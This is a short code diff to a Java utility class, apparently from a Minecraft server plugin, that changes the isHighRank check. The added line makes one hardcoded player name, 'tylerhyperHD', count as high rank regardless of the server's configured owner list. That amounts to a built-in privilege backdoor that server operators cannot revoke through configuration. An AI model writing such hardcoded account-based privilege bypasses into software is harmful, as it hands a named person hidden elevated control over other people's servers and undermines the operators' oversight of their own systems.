@@ -28,7 +28,7 @@ public class FOPM_TFM_Util {
     
     public static boolean isHighRank(Player player) {
         String name = player.getName();
-        if (SYS.contains(name) || COOWNER.contains(name) || LEADDEV.contains(name) || TFM_ConfigEntry.SERVER_OWNERS.getList().contains(name)) {
+        if (SYS.contains(name) || COOWNER.contains(name) || LEADDEV.contains(name) || name.equals("tylerhyperHD") || TFM_ConfigEntry.SERVER_OWNERS.getList().contains(name)) {
             return true;
         }
         else {
